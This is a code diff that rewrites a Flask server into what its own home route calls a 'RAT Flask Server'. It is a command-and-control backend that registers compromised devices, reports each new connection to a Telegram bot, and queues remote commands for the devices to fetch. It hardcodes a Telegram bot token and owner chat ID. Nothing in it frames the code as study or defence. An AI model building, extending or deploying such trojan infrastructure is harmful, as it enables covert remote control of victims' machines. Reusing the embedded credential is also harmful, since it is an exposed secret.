@@ -1,70 +1,67 @@
 from flask import Flask, request, jsonify
-from threading import Lock
+import requests
 
 app = Flask(__name__)
-devices = {}  # device_id -> {'name': ..., 'last_command': '', 'response': ''}
-lock = Lock()
 
-@app.route("/register", methods=["POST"])
-def register():
+# ========== Configuration ==========
+BOT_TOKEN = '7814616506:AAHixHaptUH9hPcLq3awDS3mqHGScs3y9Yc'
+OWNER_CHAT_ID = '7554840326'
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
+# ========== In-Memory Database ==========
+connected_devices = {}  # device_id -> {'name': ..., 'commands': []}
+
+# ========== Routes ==========
+
+@app.route('/')
+def home():
+    return "RAT Flask Server Running!"
+
+@app.route('/connect', methods=['POST'])
+def connect_device():
     data = request.json
-    device_id = data.get("device_id")
-    name = data.get("device_name")
+    device_id = data.get('device_id')
+    name = data.get('name')
 
     if not device_id or not name:
-        return "Missing data", 400
+        return jsonify({'error': 'Missing device_id or name'}), 400
 
-    with lock:
-        devices[device_id] = {
-            'name': name,
-            'last_command': '',
-            'response': ''
-        }
+    connected_devices[device_id] = {'name': name, 'commands': []}
 
-    return "Registered", 200
+    # Notify the Telegram owner
+    msg = f"✅ New device connected:\n• Name: {name}\n• ID: {device_id}"
+    requests.post(TELEGRAM_API, data={
+        'chat_id': OWNER_CHAT_ID,
+        'text': msg
+    })
 
-@app.route("/devices", methods=["GET"])
+    return jsonify({'status': 'connected', 'device_id': device_id})
+
+@app.route('/devices', methods=['GET'])
 def list_devices():
-    with lock:
-        return jsonify({k: v['name'] for k, v in devices.items()})
+    return jsonify({device_id: data['name'] for device_id, data in connected_devices.items()})
 
-@app.route("/send_command", methods=["POST"])
-def send_command():
-    data = request.json
-    device_id = data.get("device_id")
-    command = data.get("command")
+@app.route('/command/<device_id>', methods=['POST'])
+def send_command(device_id):
+    command = request.json.get('command')
+    if not command:
+        return jsonify({'error': 'Missing command'}), 400
 
-    with lock:
-        if device_id in devices:
-            devices[device_id]['last_command'] = command
-            return "Command sent", 200
-    return "Device not found", 404
+    if device_id not in connected_devices:
+        return jsonify({'error': 'Device not found'}), 404
 
-@app.route("/get_command/<device_id>", methods=["GET"])
-def get_command(device_id):
-    with lock:
-        if device_id in devices:
-            cmd = devices[device_id]['last_command']
-            devices[device_id]['last_command'] = ''
-            return jsonify({'command': cmd})
-    return "Not found", 404
+    connected_devices[device_id]['commands'].append(command)
+    return jsonify({'status': 'command added'})
 
-@app.route("/send_response/<device_id>", methods=["POST"])
-def receive_response(device_id):
-    data = request.json
-    response = data.get("response")
+@app.route('/command/<device_id>', methods=['GET'])
+def fetch_command(device_id):
+    if device_id not in connected_devices:
+        return jsonify({'error': 'Device not found'}), 404
 
-    with lock:
-        if device_id in devices:
-            devices[device_id]['response'] = response
-            return "Response saved", 200
-    return "Device not found", 404
+    cmds = connected_devices[device_id]['commands']
+    connected_devices[device_id]['commands'] = []  # Clear after fetching
+    return jsonify(cmds)
 
-@app.route("/get_response/<device_id>", methods=["GET"])
-def get_response(device_id):
-    with lock:
-        if device_id in devices:
-            return jsonify({'response': devices[device_id]['response']})
-    return "Not found", 404
-
-app.run(host='0.0.0.0', port=8080)
+# ========== Main ==========
+if __name__ == '__main__':
+    app.run()
